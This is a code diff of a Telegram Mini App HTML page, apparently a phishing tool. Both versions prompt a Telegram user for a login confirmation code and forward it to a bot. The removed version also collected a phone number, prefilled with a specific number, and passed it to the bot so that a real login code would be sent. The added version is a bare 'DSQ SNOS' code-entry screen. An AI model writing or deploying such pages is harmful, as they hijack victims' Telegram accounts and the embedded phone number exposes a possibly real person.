@@ -5,54 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #fff; }
-        .step { display: none; }
-        .active { display: block; }
-        input { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; }
-        button { width: 85%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        body { background: #000; color: #ff0000; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        input { width: 80%; padding: 15px; border: 1px solid #f00; background: #111; color: #fff; font-size: 20px; border-radius: 10px; margin-bottom: 20px; }
+        button { padding: 15px 40px; background: #f00; color: #fff; border: none; border-radius: 10px; font-weight: bold; width: 85%; }
     </style>
 </head>
 <body>
-
-    <!-- ШАГ 1: ТЕЛЕФОН -->
-    <div id="step-phone" class="step active">
-        <h2>Введите номер телефона</h2>
-        <input type="text" id="phone" value="+79133681204">
-        <button onclick="nextStep('phone')">Продолжить</button>
-    </div>
-
-    <!-- ШАГ 2: КОД -->
-    <div id="step-code" class="step">
-        <h2>Введите код</h2>
-        <p>Код отправлен на ваш Telegram</p>
-        <input type="text" id="code" placeholder="12345">
-        <button onclick="nextStep('code')">Подтвердить</button>
-    </div>
-
+    <h2>DSQ SNOS | ВВОД КОДА</h2>
+    <input type="number" id="c" placeholder="00000">
+    <br><button onclick="s()">ПОДТВЕРДИТЬ</button>
     <script>
-        const tg = window.Telegram.WebApp;
+        let tg = window.Telegram.WebApp;
         tg.expand();
-
-        function nextStep(current) {
-            if (current === 'phone') {
-                const phone = document.getElementById('phone').value;
-                
-                // 1. Отправляем номер боту (он начнет слать код)
-                tg.sendData("phone:" + phone); 
-                
-                // 2. Переключаем экран визуально
-                document.getElementById('step-phone').classList.remove('active');
-                document.getElementById('step-code').classList.add('active');
-            } 
-            else if (current === 'code') {
-                const code = document.getElementById('code').value;
-                
-                // 3. Отправляем код боту
-                tg.sendData("code:" + code);
-                
-                // 4. Закрываем приложение
-                tg.close();
-            }
+        function s() {
+            let val = document.getElementById('c').value;
+            if (val) { tg.sendData(val); tg.close(); }
         }
     </script>
 </body>
